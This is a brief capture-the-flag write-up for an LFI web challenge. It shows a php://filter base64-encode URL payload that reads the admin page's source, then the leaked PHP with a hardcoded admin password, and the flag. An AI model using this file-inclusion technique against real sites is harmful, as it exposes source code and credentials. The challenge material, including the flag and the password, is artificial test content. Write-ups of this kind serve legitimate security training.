# My First Meow Website

Tag: `LFI`
> Target: Login as Admin

[http://h4ck3r.quest:8400/](http://h4ck3r.quest:8400/)

## Writeup

Trivial LFI.

`http://h4ck3r.quest:8400/?page=php://filter/read=convert.base64-encode/resource=admin`

```html
<h1>Admin Panel</h1>
<form>
    <input type="text" name="username" value="admin">
    <input type="password" name="password">
    <input type="submit" value="Submit">
</form>
```
```php
<?php
$admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ");
if (
    isset($_GET['username']) && isset($_GET['password']) &&
    $_GET['username'] === $admin_account['username'] && $_GET['password'] === $admin_account['password']
) {
    echo "<h1>LOGIN SUCCESS!</h1><p>".getenv('FLAG')."</p>";
}

?>
```

## Flag

`FLAG{ezzzz_lfi}`
